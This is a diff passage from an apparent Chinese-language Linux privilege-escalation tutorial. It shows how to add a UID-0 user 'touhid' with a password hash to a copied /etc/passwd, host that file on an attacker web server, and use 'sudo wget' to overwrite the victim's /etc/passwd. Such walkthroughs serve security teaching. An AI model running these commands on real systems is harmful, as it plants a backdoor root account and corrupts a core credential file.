@@ -140,14 +140,12 @@ su touhid
 **攻擊者端**
 1. 將受害端/etc/passwd文件複製到攻擊者端中
 2. 修改文件並將passwd文件增加以下資訊，並保存
-
 ```
 touhid:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:0:0:root:/root:/bin/bash 
 ``` 
 3. 將passwd托管至Web伺服器主機
 
 **受害端**
-
 ```
 sudo wget http://192.168.56.1:8080/passwd -O /etc/passwd
 ```
